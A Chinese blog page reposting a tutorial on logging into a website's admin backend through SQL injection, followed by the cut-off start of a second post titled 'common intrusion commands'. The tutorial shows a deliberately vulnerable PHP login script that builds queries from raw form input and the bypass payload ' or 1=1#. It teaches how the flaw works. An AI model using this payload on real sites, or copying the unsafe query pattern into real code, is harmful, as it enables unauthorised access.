
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 91 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">利用SQL注入漏洞登录后台</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度搜藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<p>用户名：  密码：   <a href="http://bbs.php100.com/register.php" target="_blank">新用户注册</a></p>
<p><a href="http://bbs.php100.com/read-htm-tid-693.html" target="_blank">PHP100三不条约</a> <a href="http://www.php100.com/cms/com/intome.php?tg" target="_blank">投稿</a></p>
<p><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/data/rssmap.html" title="rss" target="_blank"><img src="" alt="rss"></a></p>
<p><a href="http://www.php100.com/" target="_blank"><img src="" alt="PHP100中文网-中国第一档PHP资源分享门户"></a></p>
<p><a href="http://www.php100.com/" target="_blank">网站首页</a> | <a href="http://www.php100.com/html/itnews/" target="_blank">业界资讯</a> | <a href="http://www.php100.com/html/webkaifa/" target="_blank">相关开发资料</a> | <a href="http://www.php100.com/html/open-php/" target="_blank">IT开源报道</a> | <a href="http://www.php100.com/html/download/" target="_blank">相关下载</a> | <a href="http://www.php100.com/html/shipinjiaocheng/" target="_blank">视频教程</a> | <a href="http://www.php100.com/job.php" target="_blank">PHP求职招聘</a> | <a href="http://www.php100.com/waibao.php" target="_blank">项目供求</a> | <a href="http://www.php100.com/share.php" target="_blank">资源共享</a> | <a href="http://bbs.php100.com/" target="_blank">PHP100中文论坛</a></p>
<p><strong><a href="http://www.php100.com/html/webkaifa/apache/" target="_blank">Apache&amp;Nginx</a> | <a href="http://www.php100.com/html/webkaifa/DIV_CSS/" target="_blank">DIVCSS</a> | <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> | <a href="http://www.php100.com/html/webkaifa/database/" target="_blank">DB</a> | <a href="http://www.php100.com/html/webkaifa/javascript/" target="_blank">JS&amp;JQuery</a> | <a href="http://www.php100.com/html/webkaifa/HTML5/" target="_blank">HTML5</a> | <a href="http://www.php100.com/html/webkaifa/Android/" target="_blank">Android</a> | <a href="http://www.php100.com/html/webkaifa/python/" target="_blank">python</a> | <a href="http://www.php100.com/html/webkaifa/ajax/" target="_blank">Ajax</a> | <a href="http://www.php100.com/html/webkaifa/xml/" target="_blank">XML&amp;JSON</a> | <a href="http://www.php100.com/html/webkaifa/Linux/" target="_blank">Linux</a> | <a href="http://www.php100.com/html/webkaifa/zhengzebiaodashi/" target="_blank">正则</a> |</strong>
<a href="http://www.chuangen.com/php_training.php" target="_blank"><img src="" alt=""></a></p>
<p><a href="http://www.php100.com/" target="_blank">首页</a> &gt; <a href="http://www.php100.com/html/webkaifa/" target="_blank">开发资料</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">PHP应用</a> &gt; 正文</p>
<h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<p>发布时间：2012-02-10 09:42:17   来源：cnblogs.com/hongfei   评论：<a href="">0</a> 点击：12173 次 【字号：<a href="">大</a> <a href="">中</a> <a href="">小</a>】</p>
<p><a href="&quot;分享到QQ空间&quot;">QQ空间</a> <a href="&quot;分享到新浪微博&quot;">新浪微博</a> <a href="&quot;分享到腾讯微博&quot;">腾讯微博</a> <a href="&quot;分享到人人网&quot;">人人网</a> <a href="&quot;分享到豆瓣网&quot;">豆瓣网</a> <a href="&quot;分享到百度空间&quot;">百度空间</a> <a href="&quot;分享到百度搜藏&quot;">百度搜藏</a> <a href="&quot;分享到开心网&quot;">开心网</a> <a href="&quot;分享到复制网址&quot;">复制</a> 更多 <a href="&quot;累计分享8次&quot;">8</a>
题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句　　早在02年，国外关于SQL注入漏洞的技术文章已...</p>
<p>题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句</p>
<p>早在02年，国外关于SQL注入漏洞的技术文章已经很多，而国内在05年左右才开始的。</p>
<p>如今，谈SQL注入漏洞是否已是明日黄花，国内大大小小的网站都已经补上漏洞。但，百密必有一疏，入侵是偶然的，但安全绝对不是必然的。</p>
<p>前些天，网上传得沸沸扬扬的“拖库”事件给我们敲响了安全警钟。</p>
<p>在开发网站的时候，出于安全考虑，需要过滤从页面传递过来的字符。通常，用户可以通过以下接口调用数据库的内容：URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。</p>
<p>现在，很多网站开发人员知其然而不知其所以然，小弟也是，所以赶紧恶补下，总结如学习内容。希望对初学者能够起到抛砖引玉的作用。</p>
<p><strong>一、SQL注入的步骤</strong></p>
<p>a) 寻找注入点(如：登录界面、留言板等)</p>
<p>b) 用户自己构造SQL语句(如：’ or 1=1/#，后面会讲解)</p>
<p>c) 将sql语句发送给数据库管理系统(DBMS)</p>
<p>d) DBMS接收请求，并将该请求解释成机器代码指令，执行必要的存取操作</p>
<p>e) DBMS接受返回的结果，并处理，返回给用户</p>
<p>因为用户构造了特殊的SQL语句，必定返回特殊的结果(只要你的SQL语句够灵活的话)。</p>
<p>下面，我通过一个实例具体来演示下SQL注入</p>
<p><strong>二、SQL注入实例详解</strong>(以上测试均假设服务器未开启magic_quote_gpc)</p>
<p>1) 前期准备工作</p>
<p>先来演示通过SQL注入漏洞，登入后台管理员界面</p>
<p>首先，创建一张试验用的数据表：</p>
<p>CREATE TABLE <code>users</code> (</p>
<p><code>id</code> int(11) NOT NULL AUTO_INCREMENT,</p>
<p><code>username</code> varchar(64) NOT NULL,</p>
<p><code>password</code> varchar(64) NOT NULL,</p>
<p><code>email</code> varchar(64) NOT NULL,</p>
<p>PRIMARY KEY (<code>id</code>),</p>
<p>UNIQUE KEY <code>username</code> (<code>username</code>)</p>
<p>) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p>
<p>添加一条记录用于测试：</p>
<p>INSERT INTO users (username,password,email)</p>
<p>VALUES(&#39;MarcoFly&#39;,md5(&#39;test&#39;),&#39;marcofly@test.com&#39;);</p>
<p>接下来，贴上登录界面的源代码：</p>
<html>
<head>
<title>Sql注入演示</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body >
<form action="validate.php" method="post">
  <fieldset >
    <legend>Sql注入演示</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密&nbsp;&nbsp;码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>

<p>附上效果图：
<img src="" alt="\"></p>
<p>当用户点击提交按钮的时候，将会把表单数据提交给validate.php页面，validate.php页面用来判断用户输入的用户名和密码有没有都符合要求(这一步至关重要，也往往是SQL漏洞所在)</p>
<p>代码如下：</p>
<html>
<head>
<title>登录验证</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body>
&lt;?php

       $conn=@mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;&#39;) or die(&quot;数据库连接失败！&quot;);;

       mysql_select_db(&quot;injection&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);

       $name=$_POST[&#39;username&#39;];

       $pwd=$_POST[&#39;password&#39;];

       $sql=&quot;select /* from users where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;

       $query=mysql_query($sql);

       $arr=mysql_fetch_array($query);

       if(is_array($arr)){

              header(&quot;Location:manager.php&quot;);

       }else{

              echo &quot;您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>&quot;;

       }

?&gt;
</body>
</html>

<p>注意到了没有，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你们将明白，这是致命的。</p>
<p>代码分析：如果，用户名和密码都匹配成功的话，将跳转到管理员操作界面(manager.php)，不成功，则给出友好提示信息。</p>
<p>登录成功的界面：
<img src="" alt="\"></p>
<p>登录失败的提示：</p>
<p><img src="" alt="\"></p>
<p>到这里，前期工作已经做好了，接下来将展开我们的重头戏：SQL注入</p>
<p>2) 构造SQL语句</p>
<p>填好正确的用户名(marcofly)和密码(test)后，点击提交，将会返回给我们“欢迎管理员”的界面。</p>
<p>因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：</p>
<p>select /* from users where username=&#39;marcofly&#39; and password=md5(&#39;test&#39;)</p>
<p>很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。</p>
<p>比如：在用户名输入框中输入:’ or 1=1/#,密码随便输入，这时候的合成后的SQL查询语句为：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>语义分析：“/#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>等价于</p>
<p>select /* from users where username=&#39;&#39; or 1=1</p>
<p>因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：</p>
<p>select /* from users</p>
<p>没错，该sql语句的作用是检索users表中的所有字段</p>
<p>小技巧：如果不知道’ or 1=1/#中的单引号的作用，可以自己echo 下sql语句，就一目了然了。</p>
<p>看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>
<p>没错，SQL注入就是这么容易。但是，要根据实际情况构造灵活的sql语句却不是那么容易的。有了基础之后，自己再去慢慢摸索吧。</p>
<p>有没有想过，如果经由后台登录窗口提交的数据都被管理员过滤掉特殊字符之后呢?这样的话，我们的万能用户名’ or 1=1/#就无法使用了。但这并不是说我们就毫无对策，要知道用户和数据库打交道的途径不止这一条。
-</p>
<p>（责任编辑：phpcms）
本文关键字：</p>
<ul>
<li><a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C0%FB%D3%C3" target="_blank">利用</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%D7%A2%C8%EB" target="_blank">注入</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C2%A9%B6%B4" target="_blank">漏洞</a></li>
</ul>
<p><strong>上一篇：</strong><a href="http://www.php100.com/html/webkaifa/javascript/2012/0210/9802.html" target="_blank">JS 调用 Flash 方法</a>
<strong>下一篇：</strong><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/9804.html" target="_blank">几个 PHP 的“魔术常量”</a></p>
<ul>
<li>14 <img src="" alt="">
震惊</li>
<li>14 <img src="" alt="">
不解</li>
<li>3 <img src="" alt="">
愤怒</li>
<li>9 <img src="" alt="">
杯具</li>
<li>18 <img src="" alt="">
无聊</li>
<li>7 <img src="" alt="">
高兴</li>
<li>17 <img src="" alt="">
支持</li>
<li>83 <img src="" alt="">
超赞</li>
</ul>
<p>分享到：  <a href=""> </a> <a href="http://v.t.sina.com.cn/share/share.php?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;appkey=3172366919&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到新浪微博" target="_blank"> </a> <a href="http://www.douban.com/recommend/?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到豆瓣" target="_blank"> </a> <a href="http://share.renren.com/share/buttonshare.do?link=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到人人" target="_blank"> </a> <a href="http://www.kaixin001.com/repaste/share.php?rtitle=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0&amp;rurl=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;rcontent=" title="分享到开心网" target="_blank"> </a> <a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html" title="分享到QQ空间" target="_blank"> </a>
最新资讯</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2013/0502/13421.html" target="_blank">PHP闭包（Closure）初探</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13419.html" target="_blank">传 iOS 7 采用扁平化设计：颠覆拟物理念</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13418.html" target="_blank">创业失败后如何找工作</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13416.html" target="_blank">程序员的时间都去了哪儿？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13413.html" target="_blank">互联网 DBA 需要做那些事</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13412.html" target="_blank">Google 眼镜的核心代码</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13411.html" target="_blank">谷歌眼镜已被越狱：或削弱谷歌对用户的控制</a></li>
</ul>
<p>热门内容</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/it/2013/0107/11895.html" title="2013年1月编程语言排行榜" target="_blank">2013年1月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0427/13409.html" title="Ubuntu 13.04 正式版发布" target="_blank">Ubuntu 13.04 正式版发布</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2011/1118/9311.html" title="百度地图推出卫星地图" target="_blank">百度地图推出卫星地图</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2009/0408/14.html" title="十天学会PHP和MYSQL视频教程篇" target="_blank">十天学会PHP和MYSQL视频教程篇</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0426/13402.html" title="如何做一个真正牛X 的开源项目" target="_blank">如何做一个真正牛X 的开源项目</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0408/13335.html" title="2013年4月编程语言排行榜" target="_blank">2013年4月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2010/0514/4515.html" title="使用方正字体侵权索赔过亿" target="_blank">使用方正字体侵权索赔过亿</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" title="如何组织大型JavaScript应用中的代码？" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
</ul>
<p><strong>热点推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0610/4712.html" title="教你如何成为PHP高手?" target="_blank">教你如何成为PHP高手?</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0114/309.html" title="PHP导入导出Excel方法" target="_blank">PHP导入导出Excel方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2011/0406/7873.html" title="Redis 的安装配置介绍" target="_blank">Redis 的安装配置介绍</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0830/3245.html" title="数据库三范式，轻松理解" target="_blank">数据库三范式，轻松理解</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0905/3268.html" title="PHP网站开发方案（开发新人必读）" target="_blank">PHP网站开发方案（开发新人必读）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0930/3362.html" title="PHP面向对象编程专题（附视频教程）" target="_blank">PHP面向对象编程专题（附视频教程）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/1101/6727.html" title="php中使用exec,system等函数调用系统命令" target="_blank">php中使用exec,system等函数调用系</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0830/5346.html" title="SVN入门及配置使用" target="_blank">SVN入门及配置使用</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0721/3087.html" title="php excel类 ，phpExcel使用方法介绍" target="_blank">php excel类 ，phpExcel使用方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0826/5308.html" title="完美解决failed to open stream: HTTP request failed!" target="_blank">完美解决failed to open stream</a>
<strong>广告赞助商</strong> <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">投放</a></li>
</ul>
<p><strong>最新视频推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/html/jiaocheng/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0422/9129.html" target="_blank">［第77讲］新浪微博开放平台 -新</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0415/9128.html" target="_blank">［第76讲］微信公共平台 - 平台</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0407/9127.html" target="_blank">［第75讲］微信公共平台 - 开放</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9125.html" target="_blank">［第74讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9124.html" target="_blank">［第73讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9123.html" target="_blank">［第72讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9122.html" target="_blank">［第71讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9121.html" target="_blank">［第70讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9120.html" target="_blank">［第69讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9119.html" target="_blank">［第68讲］thinkphp 3.1.2 系列</a>
-
<a href="http://www.php100.com/cms/com/" target="_blank">关于我们</a> | <a href="http://www.php100.com/cms/com/buddy.php" target="_blank">管理团队</a> | <a href="">网站律师</a> | <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">广告服务</a> | <a href="http://www.php100.com/cms/com/intome.php" target="_blank">投稿指南</a> | <a href="http://bbs.php100.com/thread-htm-fid-14.html" target="_blank">提建议</a> | <a href="http://www.php100.com/plus/flink.php" target="_blank">友情链接</a> | <a href="http://www.php100.com/plus/flink_add.php" target="_blank">申请加入</a> | <a href="http://www.php100.com/data/sitemap.html" target="_blank">网站地图</a></li>
</ul>
<p>Copyright (C) 2007-2011 PHP100.com, All Rights Reserved 版权所有 <a href="http://php100.com/go.php?url=http://www.php100.net/" target="_blank">上海创恩信息技术有限公司</a>. 沪ICP备08100465号
地址:上海徐汇区零陵路585号 爱邦大厦26H座 传真(FAX):021-61190281 电话(Tel):021-61190282
PHP100 Website Powered by PHPCMS. For PHP100. 服务器维护：阿里巴巴-阿里云</p>
<p><a href="http://www.cnzz.com/stat/website.php?web_id=1668579" title="站长统计" target="_blank">站长统计</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/SQL注入/">SQL注入</a></li></span></span> | <span class="tags">Tagged <a href="/tags/SQL注入/" class="label label-primary">SQL注入</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--一些常用的入侵命令-【黑客资料】/">一些常用的入侵命令 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--一些常用的入侵命令-【黑客资料】/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">一些常用的入侵命令 - 【黑客资料】</h1>
<h2 id="-x-http-bbs-hackerxfiles-net-x-"><a href="http://bbs.hackerxfiles.net/" title="黑客X档案官方论坛" target="_blank"><img src="" alt="黑客X档案官方论坛"></a></h2>
<p><a href="http://bbs.hackerxfiles.net/register.php" target="_blank">注册</a> <a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">登录</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5kb3Nib3kuY29tL3dsYXFweC5odG1s" target="_blank"><img src="" alt=""></a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/" target="_blank">论坛首页</a></li>
<li><a href="http://bbs.hackerxfiles.net/search.php" target="_blank">站内搜索</a></li>
<li><a href="http://bbs.hackerxfiles.net/task.php" target="_blank">论坛任务</a></li>
<li><a href="http://post.hackerxfiles.net/" target="_blank">邮购查询</a></li>
<li><a href="http://ip.hackerxfiles.net/" target="_blank">远控上线</a></li>
<li><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5nb3RvcmVhZC5jb20vbWFnLzEzMDEzLw==" target="_blank">在线销售</a></li>
<li><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5jcHJveHkuY24vd2ViL2hhY2tlcnhmaWxlcy5hc3A=" target="_blank">在线代理</a></li>
<li><a href="http://bbs.hackerxfiles.net/faq.php?action=credits" target="_blank">积分说明</a></li>
<li><a href="http://bbs.hackerxfiles.net/faq.php" target="_blank">新手帮助</a>
<a href="http://bbs.hackerxfiles.net/" target="_blank">黑客X档案官方论坛</a> » <a href="http://bbs.hackerxfiles.net/forum-50-1.html" target="_blank">【黑客资料】</a> » 一些常用的入侵命令</li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/forum-50-1.html" target="_blank">返回列表</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50" target="_blank">发帖</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50" target="_blank">发新话题</a></li>
